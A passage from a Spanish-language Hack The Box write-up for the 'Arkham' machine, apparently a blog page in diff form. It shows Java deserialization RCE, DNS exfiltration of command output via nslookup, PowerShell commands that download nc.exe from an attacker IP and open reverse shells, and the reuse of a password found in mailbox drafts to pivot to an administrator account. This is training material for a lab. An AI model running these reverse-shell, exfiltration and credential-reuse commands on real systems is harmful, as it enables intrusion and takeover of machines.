+<h4 id="codigo-java-github-https-github-com-sckull-ctf-stuff-tree-master-arkham"><a href="https://github.com/sckull/ctf-stuff/tree/master/arkham"><strong>Codigo Java - GitHub</strong></a></h4>
+
+<p>De igual forma realice un script en python para el mismo fin, utilizando la libreria pydes.</p>
+
+<h4 id="codigo-python-github-https-github-com-sckull-ctf-stuff-blob-master-arkham-deserialization-java-py"><a href="https://github.com/sckull/ctf-stuff/blob/master/arkham/deserialization-java.py"><strong>Codigo Python - GitHub</strong></a></h4>
+
+<h2 id="rce-request-dns">RCE - Request DNS</h2>
+
+<p><img src="../../image/htb/arkham/Peek 2019-04-17 17-49.gif" alt="image" /></p>
+
+<p>Obtenemos un request DNS y vemos que los payloads que funcionan en arkham son <code>CommonsCollections5, CommonsCollections6</code>, por lo que podemos utilizar cualquiera de ellos para ejecutar comandos en la maquina.</p>
+
+<p>De igual forma utilizando nslookup podemos saber que usuario somos y que usuarios existen en la maquina, utilizando los siguientes comandos.</p>
+
+<p><strong>whoami</strong></p>
+
+<pre><code class="language-bash">//10.10.13.129 &amp; for /f %i in ('whoami') do nslookup %i 10.10.13.129
+</code></pre>
+
+<p><strong>dir C:\Users</strong></p>
+
+<pre><code class="language-bash">//10.10.13.129 &amp; for /f &quot;tokens=1,2,3&quot; %a in ('dir /B &quot;C:\Users&quot;') do nslookup %a.%b.%c 10.10.13.129
+</code></pre>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-17 18.15.01.png" alt="image" /></p>
+
+<h2 id="reverse-shell-alfred">REVERSE SHELL - Alfred</h2>
+
+<p>Para obtener una shell inversa vamos a utilizar powershell para descargar netcat (<code>nc.exe</code>) y ejecutar una shell inversa.</p>
+
+<p><strong>Comando</strong>: Cambiamos el primer parametro de cmand a &ldquo;powershell&rdquo;.</p>
+
+<pre><code class="language-powershell">wget http://10.10.13.129/nc.exe -o C:\Users\Public\nc.exe; C:\Users\Public\nc.exe -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 10.10.13.129 443
+</code></pre>
+
+<p>Obtenemos una shell inversa como Alfred y nuestra bandera <code>User.txt</code>.</p>
+
+<p><img src="../../image/htb/arkham/Peek 2019-04-17 18-33.gif" alt="image" /></p>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-17 18.35.33.png" alt="image" /></p>
+
+<h3 id="usuarios-arkham">USUARIOS - Arkham</h3>
+
+<p>Podemos ver que existen otros dos usuarios Batman y Administrator.</p>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-17 18.57.42.png" alt="image" /></p>
+
+<p>Vemos que Batman pertenece al grupo de Administrators.</p>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-17 19.01.12.png" alt="image" /></p>
+
+<h2 id="user-batman">USER - BATMAN</h2>
+
+<p>En el directorio <code>C:\Users\alfred\Downloads\backups</code> encontramos un archivo <code>backup.zip</code>, lo trasladamos a nuestra maquina con <a href="https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/"><strong>netcat</strong></a>.</p>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-17 18.37.16.png" alt="image" /></p>
+
+<p>Al descomprimirlo nos muestra un archivo <code>.ost</code> de Microsoft Outlook, utilizamos readpst para leer el archivo de correos el cual nos extrajo los borradores (<code>Drafts.mbox</code>).</p>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-17 18.40.52.png" alt="image" /></p>
+
+<p>Para lectura de <code>Drafts.mbox</code> utilizamos <code>mutt</code>.</p>
+
+<pre><code class="language-bash">mutt -Rf Drafts.mbox
+</code></pre>
+
+<p><img src="../../image/htb/arkham/Peek 2019-04-17 18-51.gif" alt="image" /></p>
+
+<p>Encontramos una imagen de cmd con un comando que contiene un usuario y contraseña:</p>
+
+<pre><code class="language-shell">net use G: \\10.10.10.10\gotham /user:batman Zx^#QZX+T!123
+</code></pre>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-17 18.55.13.png" alt="image" /></p>
+
+<p>Utilizamos powershell para cambiar al usuario(sesion) Batman con el siguiente comando:</p>
+
+<pre><code class="language-powershell">$username =&quot;ARKHAM\batman&quot;;$password = convertto-securestring -AsPlainText -Force -String &quot;Zx^#QZX+T!123&quot;; $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password; New-PSSession -Credential $cred | Enter-PSSession
+</code></pre>
+
+<p><img src="../../image/htb/arkham/Peek 2019-04-17 19-03.gif" alt="image" /></p>
+
+<p>Exitosamente pudimos cambiar al usuario Batman pero no podemos listar los directorios y archivos.</p>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-17 19.05.15.png" alt="image" /></p>
+
+<h2 id="reverse-shell-batman">REVERSE SHELL - BATMAN</h2>
+
+<p>Para obtener una shell inversa con el usuario Batman vamos a utilizar <code>Invoke-Command</code> para descargar netcat (<code>nc.exe</code>) en el directorio de Batman y ejecutar una shell inversa, el siguiente comando se ejecuta con el usuario alfred.</p>
+
+<pre><code class="language-powershell">$username = 'ARKHAM\batman';$password = 'Zx^#QZX+T!123';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName ARKHAM -Command {powershell wget http://10.10.15.2:8081/nc.exe -o C:\Users\Batman\Documents\nc.exe; powershell C:\Users\Batman\Documents\nc.exe -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 10.10.15.2 445}
+</code></pre>
+
+<p><img src="../../image/htb/arkham/Peek 2019-04-18 15-37.gif" alt="image" /></p>
+
+<p>Obtenemos una shell y podemos ejecutar comandos, pero no podemos acceder a la carpeta de Administrator.</p>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-18 15.39.02.png" alt="image" /></p>
+
+<p>Por alguna razon el siguiente comando funciona para acceder a la carpeta de Administrator, y obtenemos nuestra bandera <code>root.txt</code>.</p>
+
+<pre><code class="language-shell">cd \\10.10.10.130\C$\Users\Administrator\
+</code></pre>
+
+<p><img src="../../image/htb/arkham/Screenshot from 2019-04-18 15.41.20.png" alt="image" /></p>
+
+    </div>    
+    <hr />
+    <div >
+      
+        
+<div id="disqus_thread"></div>
+<script>
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://sckull.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+      
+      
+    </div>
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+          
+            <span class="button next">
+              <a href="https://sckull.github.io/posts/fortune/">
+                <span class="button__text">Hack The Box - Fortune</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+      
+    
+    
+    </div>
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://sckull.github.io/assets/main.js"></script>
+<script src="https://sckull.github.io/assets/prism.js"></script>
+
+
+  
+</div>
+
+</body>
+</html>
